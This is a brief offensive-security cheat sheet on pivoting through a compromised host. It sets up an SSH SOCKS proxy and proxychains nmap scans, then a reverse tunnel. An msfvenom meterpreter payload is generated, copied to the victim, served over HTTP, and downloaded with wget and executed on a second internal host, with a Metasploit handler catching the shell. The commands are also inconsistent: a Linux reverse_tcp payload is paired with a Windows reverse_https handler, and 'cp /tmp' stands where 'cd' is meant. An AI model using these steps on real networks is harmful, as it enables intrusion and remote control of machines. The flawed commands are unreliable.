# Pivoting

## Proxy SOCKS with SSH

```bash
$ ssh -D 9050 root@victime
$ tail /etc/proxychains.conf
...
[ProxyList]
socks4 	127.0.0.1 9050
$ sudo proxychains nmap -sT -F other_host
```

To be noted:
 - Only TCP Connect Scan is supported by proxychains (default with nmap)
 - sudo is mandatory (RAW socket by proxychains)

## Reverse tunneling from other_host

### On attacker

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=other_host -f elf -o reverse.bin LPORT=4444
$ scp reverse.bin root@victim:/tmp
$ ssh -D 9050 -R victim_other_ip:4444:0.0.0.0:8000 root@victim
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

### On victim

```bash
$ cp /tmp
$ python -m http.server 8765
```

### On other_host

```bash
$ wget http://victim_other_ip:8765/reverse.bin
$ chmod +x reverse.bin
$ ./reverse.bin
```

